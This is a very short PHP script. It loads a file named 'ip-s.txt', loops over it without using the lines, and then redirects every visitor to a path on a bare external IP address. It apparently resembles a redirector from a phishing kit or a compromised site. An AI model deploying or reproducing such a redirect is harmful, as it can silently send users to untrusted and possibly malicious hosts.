<?
	$fp  = file("ip-s.txt");
	$num = count($fp);
	for($i=0;$i<$num;$i++){
		$a = $fp[$i];
	}
header('Location: http://190.42.146.152/dijisa/wapc');
?>